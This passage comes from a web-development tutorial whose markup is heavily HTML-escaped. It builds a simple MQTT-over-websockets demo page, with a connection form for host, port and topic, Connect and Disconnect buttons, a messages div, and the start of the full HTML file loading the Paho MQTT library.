  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;host&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;host&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;test.mosquitto.org&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Port:&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;port&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;port&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;8080&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Topic:&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;topic&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;topic&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;#&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;button&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token special-attr&quot;&gt;&lt;span class=&quot;token attr-name&quot;&gt;onclick&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token value javascript language-javascript&quot;&gt;&lt;span class=&quot;token function&quot;&gt;startConnect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;Connect&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;button&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token special-attr&quot;&gt;&lt;span class=&quot;token attr-name&quot;&gt;onclick&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token value javascript language-javascript&quot;&gt;&lt;span class=&quot;token function&quot;&gt;startDisconnect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;Disconnect&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;form&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The form is configured to send the MQTT configuration to the &lt;code class=&quot;language-text&quot;&gt;demo.js&lt;/code&gt; file (covered in detail below). Specifically, when the &lt;em&gt;Connect&lt;/em&gt; button is clicked it calls the &lt;code class=&quot;language-text&quot;&gt;startConnect&lt;/code&gt; function and when the &lt;em&gt;Disconnect&lt;/em&gt; button is clicked it called the &lt;code class=&quot;language-text&quot;&gt;startDisconnect&lt;/code&gt; function. We will use these function names later when writing the JavaScript code.&lt;/p&gt;
&lt;h4 id=&quot;html-adding-a-div-for-mqtt-messages&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#html-adding-a-div-for-mqtt-messages&quot; aria-label=&quot;html adding a div for mqtt messages permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;HTML: Adding a div for MQTT messages&lt;/h4&gt;
&lt;p&gt;We need one final addition to the HTML page: a location to write all MQTT messages received. It is a simple addition of a single &lt;code class=&quot;language-text&quot;&gt;div&lt;/code&gt; element under the form. Take note that the &lt;code class=&quot;language-text&quot;&gt;id&lt;/code&gt; for the &lt;code class=&quot;language-text&quot;&gt;div&lt;/code&gt; is named &lt;code class=&quot;language-text&quot;&gt;messages&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;html&quot;&gt;&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;messages&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;html-final-html-page&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#html-final-html-page&quot; aria-label=&quot;html final html page permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;HTML: Final HTML page&lt;/h4&gt;
&lt;p&gt;The entire HTML page we have made so far is documented below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;html&quot;&gt;&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token doctype&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&quot;token doctype-tag&quot;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&quot;token name&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;utf-8&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;mqtt-demo: A simple web application that can subscribe to topics from an MQTT broker over websockets&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;stylesheet&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;style.css&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;https://cdnjs.cloudflare.com/ajax/libs/paho-mqtt/1.0.2/mqttws31.min.js&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;text/javascript&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;demo.js&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;text/javascript&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;wrapper&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
         &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;h1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;mqtt-demo&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;h1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
         &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;form&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;connection-information-form&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
            &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Hostname or IP Address:&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; 
            &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;host&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;host&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;test.mosquitto.org&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
            &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Port:&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
            &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;port&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;port&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;8080&lt;span class=&quot;token 